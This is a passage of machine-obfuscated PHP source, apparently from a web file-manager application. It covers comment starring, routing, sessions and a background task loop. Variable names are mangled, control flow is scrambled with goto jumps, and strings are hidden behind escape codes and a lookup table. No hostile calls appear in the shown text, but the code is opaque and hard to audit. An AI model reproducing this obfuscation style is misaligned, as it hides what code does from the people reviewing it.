E€ÎÍÒ¶ã∑: $f»◊ùƒÏ±ã = $this->field($cåõ‹ùŒ•Ã)->where($Aùìπ˘Ïëö)->group($FóÑûºÓ†ÿ[485])->select(); return array_to_keyvalue($f»◊ùƒÏ±ã, $FóÑûºÓ†ÿ[485], $FóÑûºÓ†ÿ[481]); goto bœô–«…á; bœô–«…á: } public function starTarget($A‰æ‰Æé˜À, $f¯ôﬁ«à≠Ë) { goto fÓ¶ù¡∑Êë; f»ÍﬁÜ≈⁄ƒ: return $this->add($eÑ‰®æÀÜ¢); goto Cø˜‹Ü∂Ö√; fÓ¶ù¡∑Êë: $D∑ßÓ∑ƒÇÉ =& $_SERVER[Öíæ€“”≠éÏË]; $C∑ëπ¢ÒÀ = $A‰æ‰Æé˜À + self::TYPE_STAR_OFFSET; $aô Ÿ≥ë¯– = array($D∑ßÓ∑ƒÇÉ[1538] => USER_ID, $D∑ßÓ∑ƒÇÉ[405] => $C∑ëπ¢ÒÀ, $D∑ßÓ∑ƒÇÉ[485] => $f¯ôﬁ«à≠Ë); goto E¬†œ»Æô∑; E¬†œ»Æô∑: $b∫“‹Ö‡ç— = $this->where($aô Ÿ≥ë¯–)->find(); if ($b∫“‹Ö‡ç—) { return $this->where(array($D∑ßÓ∑ƒÇÉ[394] => $b∫“‹Ö‡ç—[$D∑ßÓ∑ƒÇÉ[394]]))->delete(); } $eÑ‰®æÀÜ¢ = array($D∑ßÓ∑ƒÇÉ[1735] => 0, $D∑ßÓ∑ƒÇÉ[1538] => USER_ID, $D∑ßÓ∑ƒÇÉ[723] => 1, $D∑ßÓ∑ƒÇÉ[728] => $D∑ßÓ∑ƒÇÉ[33], $D∑ßÓ∑ƒÇÉ[405] => $C∑ëπ¢ÒÀ, $D∑ßÓ∑ƒÇÉ[485] => $f¯ôﬁ«à≠Ë, $D∑ßÓ∑ƒÇÉ[1738] => 0, $D∑ßÓ∑ƒÇÉ[1737] => 0); goto f»ÍﬁÜ≈⁄ƒ; Cø˜‹Ü∂Ö√: } public function starTargetCount($eáê≥êÁâá, $B‰≥¢ﬁ©‡∞) { $C¶Ï…‡Ô¨≠ =& $_SERVER[Öíæ€“”≠éÏË]; $eë˘∏ò¬áƒ = $B‰≥¢ﬁ©‡∞ + self::TYPE_STAR_OFFSET; $Dºø¡õøÕí = $this->commentCount($eáê≥êÁâá, $eë˘∏ò¬áƒ); $F‘ãã›ÇÜÂ = $this->commentCount($eáê≥êÁâá, $eë˘∏ò¬áƒ, USER_ID); return array($C¶Ï…‡Ô¨≠[1740] => $Dºø¡õøÕí, $C¶Ï…‡Ô¨≠[1741] => $F‘ãã›ÇÜÂ); } public function starTargetUserList($aÈÇ¯Ø…å—, $cêØàÂ¬ÓÔ) { goto AıåËÒ•‡∆; E´‚¥í—ëé: $CÉŸç‹≈èº = $this->where($DÒãÑΩÌÖ”)->count(); $A“ùüé∆¶à = array($aÖì’œëîú[253] => $CÉŸç‹≈èº, $aÖì’œëîú[1742] => array()); if (!$CÉŸç‹≈èº) { return $A“ùüé∆¶à; } goto f‹ÖÈ«öôÉ; f‹ÖÈ«öôÉ: $côÃì∏Âÿç = $this->field($aÖì’œëîú[1538])->where($DÒãÑΩÌÖ”)->limit(500)->select(); $côÃì∏Âÿç = array_to_keyvalue($côÃì∏Âÿç, $aÖì’œëîú[33], $aÖì’œëîú[1538]); $A“ùüé∆¶à[$aÖì’œëîú[1742]] = Model($aÖì’œëîú[495])->userListInfo($côÃì∏Âÿç); goto b—Á∏”Ë«≤; AıåËÒ•‡∆: $aÖì’œëîú =& $_SERVER[Öíæ€“”≠éÏË]; $E£»ñöÃà‹ = $aÈÇ¯Ø…å— + self::TYPE_STAR_OFFSET; $DÒãÑΩÌÖ” = array($aÖì’œëîú[485] => $cêØàÂ¬ÓÔ, $aÖì’œëîú[405] => $E£»ñöÃà‹); goto E´‚¥í—ëé; b—Á∏”Ë«≤: return $A“ùüé∆¶à; goto e¨≤¥—√ÎË; e¨≤¥—√ÎË: } public function prasiseUserList($D€Ü¯®‘∆Á) { goto A≠ô˘—à·Ë; CÉ∂¥Ôâˆ: $eÖÉª√Ù–í = _get($fÏ™ÿ£≈àƒ, $aïªì¿‚Ìõ[1738], 0); $eˆ¥È÷ÁÀ¿ = array($aïªì¿‚Ìõ[253] => $eÖÉª√Ù–í, $aïªì¿‚Ìõ[1742] => array()); if (!$eÖÉª√Ù–í) { return $eˆ¥È÷ÁÀ¿; } goto B≠±øßÉŒÚ; A≠ô˘—à·Ë: $aïªì¿‚Ìõ =& $_SERVER[Öíæ€“”≠éÏË]; $eçÏëòƒºµ = array($aïªì¿‚Ìõ[1743] => $D€Ü¯®‘∆Á); $fÏ™ÿ£≈àƒ = $this->where($eçÏëòƒºµ)->find(); goto CÉ∂¥Ôâˆ; fÃË¢“°´ƒ: return $eˆ¥È÷ÁÀ¿; goto B§∂ºΩªÜÊ; B≠±øßÉŒÚ: $bÏ√â∆äÆó = Model($aïªì¿‚Ìõ[1744])->field($aïªì¿‚Ìõ[1538])->where($eçÏëòƒºµ)->limit(500)->select(); $bÏ√â∆äÆó = array_to_keyvalue($bÏ√â∆äÆó, $aïªì¿‚Ìõ[33], $aïªì¿‚Ìõ[1538]); $eˆ¥È÷ÁÀ¿[$aïªì¿‚Ìõ[1742]] = Model($aïªì¿‚Ìõ[495])->userListInfo($bÏ√â∆äÆó); goto fÃË¢“°´ƒ; B§∂ºΩªÜÊ: } public function remove($BÃê“ÆµêÛ) { $d√ù©â√’º =& $_SERVER[Öíæ€“”≠éÏË]; $Cøö∫•Áèõ = array($d√ù©â√’º[1736] => $BÃê“ÆµêÛ); $CâÌÏÏ¡®¡ = $this->where($Cøö∫•Áèõ)->find(); if ($CâÌÏÏ¡®¡[$d√ù©â√’º[1735]]) { $this->where(array($d√ù©â√’º[1736] => $CâÌÏÏ¡®¡[$d√ù©â√’º[1735]]))->setAdd($d√ù©â√’º[1737], -1); } return $this->where($Cøö∫•Áèõ)->delete(); } public function edit($EÑœ◊“Œ›è, $BÆπäè±µ√) { $DåóÓ≤¢Éó =& $_SERVER[Öíæ€“”≠éÏË]; $fåë©π¶í• = array($DåóÓ≤¢Éó[1736] => $EÑœ◊“Œ›è); return $this->where($fåë©π¶í•)->save(array($DåóÓ≤¢Éó[1745] => $BÆπäè±µ√)); } public function prasise($eÖî˘ùÚ∑ö) { $eﬂËƒ±œÇ´ =& $_SERVER[Öíæ€“”≠éÏË]; $båÈ›Çß∂Ê = Model($eﬂËƒ±œÇ´[1746]); $A™ßÊÑ§Ú· = array($eﬂËƒ±œÇ´[1736] => $eÖî˘ùÚ∑ö, $eﬂËƒ±œÇ´[1529] => USER_ID); $aÃ°ÏÀçàƒ = $båÈ›Çß∂Ê->where($A™ßÊÑ§Ú·)->find(); if (!$aÃ°ÏÀçàƒ) { $båÈ›Çß∂Ê->add($A™ßÊÑ§Ú·); $AπÕƒÏ¬¨ˆ = $this->where(array($eﬂËƒ±œÇ´[1736] => $eÖî˘ùÚ∑ö))->setAdd($eﬂËƒ±œÇ´[1738], 1); } else { $båÈ›Çß∂Ê->where($A™ßÊÑ§Ú·)->delete(); $AπÕƒÏ¬¨ˆ = $this->where(array($eﬂËƒ±œÇ´[1736] => $eÖî˘ùÚ∑ö))->setAdd($eﬂËƒ±œÇ´[1738], -1); } return $AπÕƒÏ¬¨ˆ; } public function targetInfo($F®Ôª≥‚êÒ, $aì»Úœ¢ç’) { goto b©ÿ˜Ï Õ¶; eÓ¨î≤¨¨€: $CâÜ¡°üû¢ = "\x52\111\x47\110\124\x20\112\x4f\111\116\x20{$this->tablePrefix}\143\157\x6d\155\x65\x6e\164\x5f\160\162\x61\x69\x73\145\40\163\x74\x61\162\40\x6f\156\40\143\157\x6d\155\145\156\x74\56\x63\x6f\155\x6d\145\156\164\111\x44\x20\x3d\x20\x73\164\141\x72\x2e\x63\157\155\x6d\x65\x6e\x74\111\104"; $c¡¨Òó¡«… = $this->alias($c»”üéÆÉ”[352])->where($fòªòÀ˜Ïç)->join($CâÜ¡°üû¢, $c»”üéÆÉ”[1747])->count(); $Cïƒ¿”ø’Ê = array($c»”üéÆÉ”[1748] => $cûÍ“íÆÃ‡, $c»”üéÆÉ”[1749] => $c¡¨Òó¡«…); goto eøëîûÍ•â; eøëîûÍ•â: return $Cïƒ¿”ø’Ê; goto BëèµÏ ∑ó; b©ÿ˜Ï Õ¶: $c»”üéÆÉ” =& $_SERVER[Öíæ€“”≠éÏË]; $fòªòÀ˜Ïç = array($c»”üéÆÉ”[563] => $F®Ôª≥‚êÒ, $c»”üéÆÉ”[564] => $aì»Úœ¢ç’); $cûÍ“íÆÃ‡ = $this->where($fòªòÀ˜Ïç)->count(); goto eÓ¨î≤¨¨€; BëèµÏ ∑ó: } public function listData($dÑ¯èåÏƒ˜) { $bƒ€éÔøªü =& $_SERVER[Öíæ€“”≠éÏË]; if (isset($dÑ¯èåÏƒ˜[$bƒ€éÔøªü[1750]])) { if ($dÑ¯èåÏƒ˜[$bƒ€éÔøªü[1750]]) { $dÑ¯èåÏƒ˜[$bƒ€éÔøªü[1743]] = array($bƒ€éÔøªü[982], intval($dÑ¯èåÏƒ˜[$bƒ€éÔøªü[1750]])); } unset($dÑ¯èåÏƒ˜[$bƒ€éÔøªü[1750]]); } if (isset($dÑ¯èåÏƒ˜[$bƒ€éÔøªü[1751]])) { if ($dÑ¯èåÏƒ˜[$bƒ€éÔøªü[1751]]) { $dÑ¯èåÏƒ˜[$bƒ€éÔøªü[1743]] = array($bƒ€éÔøªü[979], intval($dÑ¯èåÏƒ˜[$bƒ€éÔøªü[1751]])); } unset($dÑ¯èåÏƒ˜[$bƒ€éÔøªü[1751]]); } return $this->_listData($dÑ¯èåÏƒ˜); } private function _listData($c¬êÇ—√Ìø) { $a¿ê„Ö«¿… =& $_SERVER[Öíæ€“”≠éÏË]; $D…ïÏÔˆºã = $this->where($c¬êÇ—√Ìø)->_makeOrder()->selectPage(100); $this->_listAppendParent($D…ïÏÔˆºã[$a¿ê„Ö«¿…[367]]); $this->_listAppendUser($D…ïÏÔˆºã[$a¿ê„Ö«¿…[367]]); $this->_listAppendMeta($D…ïÏÔˆºã[$a¿ê„Ö«¿…[367]]); return $D…ïÏÔˆºã; } private function _makeOrder() { $eéá∂ãæÍé =& $_SERVER[Öíæ€“”≠éÏË]; $F£ÕÀ„™ıã = array($eéá∂ãæÍé[1738], $eéá∂ãæÍé[1737], $eéá∂ãæÍé[194]); $A∂˜àƒ”ì· = Input::get($eéá∂ãæÍé[436], $eéá∂ãæÍé[7], $eéá∂ãæÍé[417], $F£ÕÀ„™ıã); $Aêñ€¿ôüÆ = Input::get($eéá∂ãæÍé[437], $eéá∂ãæÍé[7], $eéá∂ãæÍé[1531], array($eéá∂ãæÍé[1752], $eéá∂ãæÍé[432])); $B·‚¢„ºé» = $A∂˜àƒ”ì· . $eéá∂ãæÍé[50] . $Aêñ€¿ôüÆ; return $this->order($B·‚¢„ºé»); } private function _listAppendParent(&$d¶Ùﬂ€ÀÏÒ) { goto Aì◊·•Èî⁄; E∆ﬂó…Ωê“: foreach ($d¶Ùﬂ€ÀÏÒ as &$bÜüŸâ…¿œ) { if (isset($E‚Â≈´Ç’ê[$bÜüŸâ…¿œ[$cÏÜÉÏû™⁄[1735]]])) { $bÜüŸâ…¿œ[$cÏÜÉÏû™⁄[1753]] = $E‚Â≈´Ç’ê[$bÜüŸâ…¿œ[$cÏÜÉÏû™⁄[1735]]]; } } unset($bÜüŸâ…¿œ); goto b·åÌÇøÛΩ; Aì◊·•Èî⁄: $cÏÜÉÏû™⁄ =& $_SERVER[Öíæ€“”≠éÏË]; $CÑ≥ú¿Á™Ò = array_unique(array_to_keyvalue($d¶Ùﬂ€ÀÏÒ, $cÏÜÉÏû™⁄[33], $cÏÜÉÏû™⁄[1735])); $CÑ≥ú¿Á™Ò = array_remove_value($CÑ≥ú¿Á™Ò, $cÏÜÉÏû™⁄[191]); goto e∆ì»ˆﬂ£¯; e∆ì»ˆﬂ£¯: if (!$CÑ≥ú¿Á™Ò) { return; } $E‚Â≈´Ç’ê = $this->where(array($cÏÜÉÏû™⁄[1736] => array($cÏÜÉÏû™⁄[7], $CÑ≥ú¿Á™Ò)))->select(); $E‚Â≈´Ç’ê = array_to_keyvalue($E‚Â≈´Ç’ê, $cÏÜÉÏû™⁄[1743]); goto E∆ﬂó…Ωê“; b·åÌÇøÛΩ: } private function _listAppendUser(&$c∏ˆöö«ﬂ§) { goto EÍ¬‰ûÂÆ; fÊûúÖÆíé: foreach ($c∏ˆöö«ﬂ§ as &$FËû⁄‘ÎÓå) { $FËû⁄‘ÎÓå[$d»ïﬂÀ”îÇ[576]] = $d∞°è¡ÔÍÀ[$FËû⁄‘ÎÓå[$d»ïﬂÀ”îÇ[1538]]]; if (isset($FËû⁄‘ÎÓå[$d»ïﬂÀ”îÇ[1753]])) { $FËû⁄‘ÎÓå[$d»ïﬂÀ”îÇ[1753]][$d»ïﬂÀ”îÇ[576]] = $d∞°è¡ÔÍÀ[$FËû⁄‘ÎÓå[$d»ïﬂÀ”îÇ[1753]][$d»ïﬂÀ”îÇ[1538]]]; } } unset($FËû⁄‘ÎÓå); goto eâ…ó˘©; B™åØ√˜ﬂ: if (count($A¯›¯»í¡˜) == 0) { return; } foreach ($c∏ˆöö«ﬂ§ as $FËû⁄‘ÎÓå) { if (isset($FËû⁄‘ÎÓå[$d»ïﬂÀ”îÇ[1753]])) { $A¯›¯»í¡˜[] = $FËû⁄‘ÎÓå[$d»ïﬂÀ”îÇ[1753]][$d»ïﬂÀ”îÇ[1538]]; } } $d∞°è¡ÔÍÀ = Model($d»ïﬂÀ”îÇ[520])->userListInfo($A¯›¯»í¡˜); goto fÊûúÖÆíé; EÍ¬‰ûÂÆ: $d»ïﬂÀ”îÇ =& $_SERVER[Öíæ€“”≠éÏË]; $A¯›¯»í¡˜ = array_unique(array_to_keyvalue($c∏ˆöö«ﬂ§, $d»ïﬂÀ”îÇ[33], $d»ïﬂÀ”îÇ[1538])); $A¯›¯»í¡˜ = array_remove_value($A¯›¯»í¡˜, $d»ïﬂÀ”îÇ[191]); goto B™åØ√˜ﬂ; eâ…ó˘©: } private function _listAppendMeta(&$C±°†¯ÖßÂ) { goto a§√‚ÿ•ı’; a§√‚ÿ•ı’: $CçÒ±…ëé† =& $_SERVER[Öíæ€“”≠éÏË]; $eà±àÁï‹∂ = array_unique(array_to_keyvalue($C±°†¯ÖßÂ, $CçÒ±…ëé†[33], $CçÒ±…ëé†[1743])); $eà±àÁï‹∂ = array_remove_value($eà±àÁï‹∂, $CçÒ±…ëé†[191]); goto e≥Áπ≥‰“ƒ; e≥Áπ≥‰“ƒ: if (!$eà±àÁï‹∂) { return; } foreach ($C±°†¯ÖßÂ as $Aåñçß“Óì) { if (isset($Aåñçß“Óì[$CçÒ±…ëé†[1753]])) { $eà±àÁï‹∂[] = $Aåñçß“Óì[$CçÒ±…ëé†[1753]][$CçÒ±…ëé†[1743]]; } } $d‡Ö˘ÍÃé© = $this->metaList($eà±àÁï‹∂); goto EóüÏ≈âıÛ; EóüÏ≈âıÛ: if (!$d‡Ö˘ÍÃé©) { return !1; } foreach ($C±°†¯ÖßÂ as &$Aåñçß“Óì) { $Aåñçß“Óì[$CçÒ±…ëé†[446]] = $d‡Ö˘ÍÃé©[$Aåñçß“Óì[$CçÒ±…ëé†[1743]]]; if (isset($Aåñçß“Óì[$CçÒ±…ëé†[1753]])) { $Aåñçß“Óì[$CçÒ±…ëé†[1753]][$CçÒ±…ëé†[446]] = $d‡Ö˘ÍÃé©[$Aåñçß“Óì[$CçÒ±…ëé†[1753]][$CçÒ±…ëé†[1743]]]; } } unset($Aåñçß“Óì); goto F´ë‚€œ¿; F´ë‚€œ¿: } private function metaList($CùÒè≤Øå≤) { goto A◊πæ…Ωâœ; d◊—âúÙÂá: return $Bƒâá»ÁÙ‰ ? $Bƒâá»ÁÙ‰ : array(); goto f≠õ¢´åßû; A◊πæ…Ωâœ: $B∑í»˜◊à• =& $_SERVER[Öíæ€“”≠éÏË]; if (!$CùÒè≤Øå≤) { return array(); } $e…çÓá⁄òë = array($B∑í»˜◊à•[1743] => array($B∑í»˜◊à•[7], $CùÒè≤Øå≤)); goto c∂¢á÷”ëÿ; c∂¢á÷”ëÿ: $Bƒâá»ÁÙ‰ = Model($B∑í»˜◊à•[1754])->where($e…çÓá⁄òë)->select(); $Bƒâá»ÁÙ‰ = array_to_keyvalue_group($Bƒâá»ÁÙ‰, $B∑í»˜◊à•[1743]); foreach ($Bƒâá»ÁÙ‰ as $BÖÈñå£≤Â => $A© ÉÿÎ‘¡) { $D±±Àá±æä = array(); foreach ($A© ÉÿÎ‘¡ as $E”üÚ·áªø) { $D±±Àá±æä[$E”üÚ·áªø[$B∑í»˜◊à•[93]]] = $E”üÚ·áªø[$B∑í»˜◊à•[372]]; } $Bƒâá»ÁÙ‰[$BÖÈñå£≤Â] = $D±±Àá±æä; } goto d◊—âúÙÂá; f≠õ¢´åßû: } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\151\154\x65\x5f\143\157\x6e\x74\145\x6e\x74\x73"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\x54\x69\155\145", "\x74\x69\x6d\145", "\x69\156\x73\145\x72\164", "\x66\x75\156\x63\x74\x69\157\x6e")); } goto d™«ÜÃùçƒ; cõ’õÂË”‡: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\x79" => "\133\136\57\135\53", "\72\156\165\x6d" => "\133\x30\x2d\71\x5d\x2b", "\72\x61\x6c\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($a≈ÉÍ§Æç±, $c¢àù‚¥†„) { $a◊ãß¡å¶« =& $_SERVER[Öíæ€“”≠éÏË]; if ($a≈ÉÍ§Æç± == $a◊ãß¡å¶«[1486]) { $D∞°åÁåÕπ = array_map($a◊ãß¡å¶«[1487], $c¢àù‚¥†„[0]); $BíåΩœÁ‹ç = strpos($c¢àù‚¥†„[1], $a◊ãß¡å¶«[8]) === 0 ? $c¢àù‚¥†„[1] : $a◊ãß¡å¶«[8] . $c¢àù‚¥†„[1]; $CΩ¬∏‡ˆ¯¥ = $c¢àù‚¥†„[2]; } else { $D∞°åÁåÕπ = null; $BíåΩœÁ‹ç = strpos($c¢àù‚¥†„[0], $a◊ãß¡å¶«[8]) === 0 ? $c¢àù‚¥†„[0] : $a◊ãß¡å¶«[8] . $c¢àù‚¥†„[0]; $CΩ¬∏‡ˆ¯¥ = $c¢àù‚¥†„[1]; } array_push(self::$maps, $D∞°åÁåÕπ); array_push(self::$routes, $BíåΩœÁ‹ç); array_push(self::$methods, strtoupper($a≈ÉÍ§Æç±)); array_push(self::$callbacks, $CΩ¬∏‡ˆ¯¥); } public static function error($aì„•ê±ﬁß) { self::$errorCallback = $aì„•ê±ﬁß; } public static function haltOnMatch($cïåﬂêÍêæ = true) { self::$halts = $cïåﬂêÍêæ; } public static function dispatch() { goto e¡Ãæã“É´; e¡Ãæã“É´: $e‚Çƒ◊’¨ü =& $_SERVER[Öíæ€“”≠éÏË]; $fﬂ“èÔÂÙﬂ = parse_url($_SERVER[$e‚Çƒ◊’¨ü[1488]], PHP_URL_PATH); $Aˆ§úΩ«∞ü = $_SERVER[$e‚Çƒ◊’¨ü[157]]; goto fØè∆Û◊Ù; FåæŸßﬁã§: self::$routes = preg_replace($e‚Çƒ◊’¨ü[1173], $e‚Çƒ◊’¨ü[8], self::$routes); if (in_array($fﬂ“èÔÂÙﬂ, self::$routes)) { $CßÏê…˜‹ = array_keys(self::$routes, $fﬂ“èÔÂÙﬂ); foreach ($CßÏê…˜‹ as $aâ◊§ù÷·º) { if (self::$methods[$aâ◊§ù÷·º] == $Aˆ§úΩ«∞ü || self::$methods[$aâ◊§ù÷·º] == $e‚Çƒ◊’¨ü[1489] || in_array($Aˆ§úΩ«∞ü, self::$maps[$aâ◊§ù÷·º])) { $a≥ﬂˆ∂ƒ œ = !0; if (!is_object(self::$callbacks[$aâ◊§ù÷·º])) { $E‡êåûêÆ¨ = explode($e‚Çƒ◊’¨ü[8], self::$callbacks[$aâ◊§ù÷·º]); $B£Õ≈Û∞Œ– = end($E‡êåûêÆ¨); $FÏè≈–£§ƒ = explode($e‚Çƒ◊’¨ü[1490], $B£Õ≈Û∞Œ–); $dÇùÎ‡©≠Â = new $FÏè≈–£§ƒ[0](); $dÇùÎ‡©≠Â->{$FÏè≈–£§ƒ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$aâ◊§ù÷·º]); if (self::$halts) { return; } } } } } else { $EÈ‘∂®≠Ç´ = 0; foreach (self::$routes as $aâ◊§ù÷·º) { if (strpos($aâ◊§ù÷·º, $e‚Çƒ◊’¨ü[4]) !== !1) { $aâ◊§ù÷·º = str_replace($dŸœñØÁÎµ, $D√«‡†Üæı, $aâ◊§ù÷·º); } if (preg_match($e‚Çƒ◊’¨ü[1491] . $aâ◊§ù÷·º . $e‚Çƒ◊’¨ü[1492], $fﬂ“èÔÂÙﬂ, $F∏‰ÖÕπåö)) { if (self::$methods[$EÈ‘∂®≠Ç´] == $Aˆ§úΩ«∞ü || self::$methods[$EÈ‘∂®≠Ç´] == $e‚Çƒ◊’¨ü[1489] || !empty(self::$maps[$EÈ‘∂®≠Ç´]) && in_array($Aˆ§úΩ«∞ü, self::$maps[$EÈ‘∂®≠Ç´])) { $a≥ﬂˆ∂ƒ œ = !0; array_shift($F∏‰ÖÕπåö); if (!is_object(self::$callbacks[$EÈ‘∂®≠Ç´])) { $E‡êåûêÆ¨ = explode($e‚Çƒ◊’¨ü[8], self::$callbacks[$EÈ‘∂®≠Ç´]); $B£Õ≈Û∞Œ– = end($E‡êåûêÆ¨); $FÏè≈–£§ƒ = explode($e‚Çƒ◊’¨ü[1490], $B£Õ≈Û∞Œ–); $dÇùÎ‡©≠Â = new $FÏè≈–£§ƒ[0](); if (!method_exists($dÇùÎ‡©≠Â, $FÏè≈–£§ƒ[1])) { echo $e‚Çƒ◊’¨ü[1493]; } else { call_user_func_array(array($dÇùÎ‡©≠Â, $FÏè≈–£§ƒ[1]), $F∏‰ÖÕπåö); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$EÈ‘∂®≠Ç´], $F∏‰ÖÕπåö); if (self::$halts) { return; } } } } $EÈ‘∂®≠Ç´++; } } if ($a≥ﬂˆ∂ƒ œ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $fœÌÏê¢Œé =& $_SERVER[Öíæ€“”≠éÏË]; header($_SERVER[$fœÌÏê¢Œé[1494]] . $fœÌÏê¢Œé[1495]); echo $fœÌÏê¢Œé[1496]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$e‚Çƒ◊’¨ü[1488]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto AÜË≠’êÙ˘; fØè∆Û◊Ù: $dŸœñØÁÎµ = array_keys(static::$patterns); $D√«‡†Üæı = array_values(static::$patterns); $a≥ﬂˆ∂ƒ œ = !1; goto FåæŸßﬁã§; AÜË≠’êÙ˘: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto dìê¨⁄Ü⁄Ü; F∏¢Ë±““≥: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $Fû–‰âÜãö = new self(); return $Fû–‰âÜãö; goto Fö–êﬁ¡√ô; bΩÚœ∞”Í∫: $E¶ë–«´Èë = $Dá´•¶äï[$fàçÒÍ’ïõ]; $F˘ÓÜ€âïÜ = $Dá´•¶äï[$e÷å≥Œ˘§‰[806]]; switch ($fàçÒÍ’ïõ) { case $e÷å≥Œ˘§‰[17]: self::$handle = Model($e÷å≥Œ˘§‰[807]); break; case $e÷å≥Œ˘§‰[808]: self::$handle = new CacheRedis($E¶ë–«´Èë, $F˘ÓÜ€âïÜ); break; case $e÷å≥Œ˘§‰[809]: self::$handle = new CacheMemcached($E¶ë–«´Èë, $F˘ÓÜ€âïÜ); break; case $e÷å≥Œ˘§‰[193]: $E¶ë–«´Èë[$e÷å≥Œ˘§‰[76]] = $E¶ë–«´Èë[$e÷å≥Œ˘§‰[76]] . $e÷å≥Œ˘§‰[1500]; self::$handle = new CacheFile($E¶ë–«´Èë, $F˘ÓÜ€âïÜ); default: break; } goto F∏¢Ë±““≥; dìê¨⁄Ü⁄Ü: $e÷å≥Œ˘§‰ =& $_SERVER[Öíæ€“”≠éÏË]; static $Fû–‰âÜãö = false; if ($Fû–‰âÜãö) { return $Fû–‰âÜãö; } goto AÃø√ú“—Ì; b€»‘÷Ùòü: if (self::$sessionSign) { } else { if (Cookie::get($F∫‹®∂Íµé)) { self::$sessionSign = Cookie::get($F∫‹®∂Íµé); } else { self::$sessionSign = guid(); } } Cookie::setSafe($F∫‹®∂Íµé, self::$sessionSign, self::$sessionTime); $fàçÒÍ’ïõ = $Dá´•¶äï[$e÷å≥Œ˘§‰[1499]]; goto bΩÚœ∞”Í∫; AÃø√ú“—Ì: $Dá´•¶äï = $GLOBALS[$e÷å≥Œ˘§‰[6]][$e÷å≥Œ˘§‰[347]]; self::$sessionTime = $Dá´•¶äï[$e÷å≥Œ˘§‰[1497]]; $F∫‹®∂Íµé = isset($GLOBALS[$e÷å≥Œ˘§‰[1498]]) ? $GLOBALS[$e÷å≥Œ˘§‰[1498]] : SESSION_ID; goto b€»‘÷Ùòü; Fö–êﬁ¡√ô: } public static function sign($a‡ë¬øŒ√“ = false) { $a‡ë¬øŒ√“ && (self::$sessionSign = $a‡ë¬øŒ√“); self::init(); return self::$sessionSign; } public static function set($fáéº⁄≠É©, $F›êÁÉâ™Ü = false) { self::init(); if (is_array($fáéº⁄≠É©)) { foreach ($fáéº⁄≠É© as $E´Ö∏‹êßã => $bù’éıÔÆÏ) { array_set_value(self::$data, $E´Ö∏‹êßã, $bù’éıÔÆÏ); } } else { array_set_value(self::$data, $fáéº⁄≠É©, $F›êÁÉâ™Ü); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($C™≈‚ëµ°î = false) { self::init(); if (!$C™≈‚ëµ°î) { return self::$data; } return array_get_value(self::$data, $C™≈‚ëµ°î); } public static function remove($C¥£ÔÕíˆ¥) { self::init(); unset(self::$data[$C¥£ÔÕíˆ¥]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Öíæ€“”≠éÏË][811])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto c¢…Öπ˜Ç‡; c¢…Öπ˜Ç‡: $fﬁﬁ¿…ÈªÖ =& $_SERVER[Öíæ€“”≠éÏË]; if (self::valueGet($fﬁﬁ¿…ÈªÖ[723]) != $fﬁﬁ¿…ÈªÖ[87]) { return; } if (self::valueGet($fﬁﬁ¿…ÈªÖ[1501]) == $fﬁﬁ¿…ÈªÖ[87]) { $Díê—∆‚∑‘ = self::valueGet($fﬁﬁ¿…ÈªÖ[1502]); if (time() - $Díê—∆‚∑‘ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto A‰¥™ø€ÃÆ; AÈã€›Ôç: while (!0) { self::cacheClear(); if (self::valueGet($fﬁﬁ¿…ÈªÖ[723]) != $fﬁﬁ¿…ÈªÖ[87]) { self::valueSet($fﬁﬁ¿…ÈªÖ[1501], $fﬁﬁ¿…ÈªÖ[191]); self::log($fﬁﬁ¿…ÈªÖ[1505]); die; } self::valueSet($fﬁﬁ¿…ÈªÖ[1501], $fﬁﬁ¿…ÈªÖ[87]); self::valueSet($fﬁﬁ¿…ÈªÖ[1502], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto bﬂöÈÁÜª•; A‰¥™ø€ÃÆ: http_close(); self::valueSet($fﬁﬁ¿…ÈªÖ[1501], $fﬁﬁ¿…ÈªÖ[87]); Hook::bind($fﬁﬁ¿…ÈªÖ[1503], $fﬁﬁ¿…ÈªÖ[1504]); goto AÈã€›Ôç; bﬂöÈÁÜª•: } public static function restart() { $A£∑≤Ö‚Â§ =& $_SERVER[Öíæ€“”≠éÏË]; http_close(); self::valueSet($A£∑≤Ö‚Â§[723], $A£∑≤Ö‚Â§[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($A£∑≤Ö‚Â§[1501], $A£∑≤Ö‚Â§[191]); self::valueSet($A£∑≤Ö‚Â§[723], $A£∑≤Ö‚Â§[87]); } public static function shutdownEvent() { $F≈˘âê∆µ„ =& $_SERVER[Öíæ€“”≠éÏË]; self::valueSet($F≈˘âê∆µ„[1501], $F≈˘âê∆µ„[191]); self::log($F≈˘âê∆µ„[1506]); } public static function config($FãåÌÉâ≈ü, $DÍ∆⁄åøïº) { self::valueSet($_SERVER[Öíæ€“”≠éÏË][723], $FãåÌÉâ≈ü); } private static function taskRunAll() { goto EìÙ∂π«≠Ñ; BÜ–áº¬ÿª: self::taskQueueRun($E≠˜ú€√ÎÃ); goto FñÜÙ®˘¿ã; CÕ†»èãﬁô: $Aÿ‚Æ§¢ ≤ = count($d∑íàΩªèé); for ($aú–¥ô•íÑ = 0; 